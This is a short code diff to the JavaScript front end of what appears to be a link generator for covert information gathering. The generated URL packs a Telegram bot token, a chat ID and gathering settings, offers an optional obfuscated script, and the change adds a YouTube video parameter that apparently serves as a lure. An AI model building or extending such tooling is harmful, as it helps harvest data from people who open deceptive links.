@@ -4,6 +4,7 @@ const hookJsonInput = document.getElementById("hookJsonInput");
 const queryStringInput = document.getElementById("queryStringInput");
 const baseUrlInput = document.getElementById("baseUrlInput");
 const pollingIntervalInput = document.getElementById("pollingIntervalInput");
+const youtubeVideoID  = document.getElementById("youtubeVideoID");
 
 //BUTTONS
 const showHidetokenButton = document.getElementById("showHidetokenButton");
@@ -189,6 +190,9 @@ const generateURL=async()=>{
             if(obfuscateJsCheckbox.checked == true){value+=`?js=${obfuscatedJS_path}&`}else{value+=`?js=${normalJS_path}&`};
             const encryptedValue = btoa(`${botTokenInput.value}|${selectedChatIdValue}|${informationGatheringUrlGeneration()}`)
             value+=`val=${getRandomChar()}${encryptedValue}`; 
+            if(youtubeVideoID.value!=""){
+                value+=`&yt=${youtubeVideoID.value}`
+            }
             let Finalvalue = `${isURL(baseUrlValue)?baseUrlValue:""}${value}`
             return Finalvalue;   
         }
